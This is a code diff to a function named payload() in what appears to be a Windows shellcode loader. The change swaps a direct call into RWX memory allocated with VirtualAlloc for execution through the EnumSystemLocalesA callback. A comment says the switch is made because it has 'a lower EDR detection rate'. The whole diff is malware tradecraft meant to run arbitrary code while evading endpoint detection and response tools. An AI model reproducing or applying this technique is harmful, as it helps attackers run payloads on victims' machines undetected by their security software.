@@ -144,7 +144,23 @@ int payload () {
 
 		} while (dwSize > 0);
 
-		void* exec = VirtualAlloc(
+//		void* exec = VirtualAlloc(
+//			0,
+//			buffer.size() + 1,
+//			MEM_COMMIT | MEM_RESERVE,
+//			PAGE_EXECUTE_READWRITE);
+
+	
+//		memcpy(
+//			exec,
+//			buffer.data(),
+//			buffer.size());
+
+//		((void(*)())exec)();
+
+// This method replaces lines 147 through 159 - This has a lower EDR detection rate as EnumSystemLocalesA api is not normally used to execute code.
+
+			LPVOID mem = VirtualAlloc(
 			0,
 			buffer.size() + 1,
 			MEM_COMMIT | MEM_RESERVE,
@@ -152,11 +168,12 @@ int payload () {
 
 	
 		memcpy(
-			exec,
+			mem,
 			buffer.data(),
 			buffer.size());
 
-		((void(*)())exec)();
+		EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);
+	
 	}
 
 //Closes Handles 
